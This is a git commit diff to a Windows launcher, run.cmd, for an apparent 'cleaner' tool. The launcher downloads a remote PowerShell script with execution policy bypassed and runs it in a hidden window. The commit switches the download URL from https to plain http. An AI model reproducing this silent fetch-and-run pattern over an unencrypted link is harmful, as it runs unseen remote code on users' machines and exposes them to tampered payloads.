4acdf2f37699f997af894a568f2c4820d312e569
cleands <sevao2021@mail.ru>
2026-08-02 17:25:17 +0300

    Change script download URL in run.cmd
    Updated script download URL to use raw GitHub content.

--- run.cmd
+++ run.cmd
@@ -5,7 +5,7 @@ set "PS_FILE=%TEMP%\cleaner_ds_temp.ps1"
 
 REM Скачиваем скрипт во временную папку[cite: 6]
 powershell -NoProfile -ExecutionPolicy Bypass -Command ^
-    "[System.IO.File]::WriteAllText('%PS_FILE%', (Invoke-RestMethod -Uri 'https://cleands.github.io/cds/script.ps1'), [System.Text.Encoding]::UTF8)"
+    "[System.IO.File]::WriteAllText('%PS_FILE%', (Invoke-RestMethod -Uri 'http://raw.githubusercontent.com/cleands/cds/refs/heads/main/script.ps1'), [System.Text.Encoding]::UTF8)"
 
 REM Запускаем скачанный скрипт в скрытом режиме[cite: 6]
 powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "%PS_FILE%"
